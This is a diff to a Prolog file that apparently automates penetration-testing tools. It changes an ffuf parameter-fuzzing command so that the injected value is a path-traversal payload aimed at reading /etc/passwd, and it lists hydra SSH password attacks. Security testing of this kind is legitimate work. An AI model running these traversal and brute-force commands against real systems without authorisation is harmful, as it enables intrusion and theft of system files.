@@ -73,7 +73,7 @@ profile(http_param_fuzz, [ipv4=Ip, uri_ipv4=Uri_ipv4, port=Port, uri_port=Uri_po
 
 
 http_param_fuzz(Parameters, Command) :- 
-	format_command("ffuf -ac -u http://~w:~w~w?FUZZ=a -w wordlists/parameter-names.txt", [Parameters.ipv4, Parameters.port, Parameters.page], Command). 
+	format_command("ffuf -ac -u http://~w:~w~w?FUZZ=../../../../etc/passwd -w wordlists/parameter-names.txt", [Parameters.ipv4, Parameters.port, Parameters.page], Command). 
 
 tool(hydra, ssh_attack).
 tool(hydra, ssh_account_password_attack).
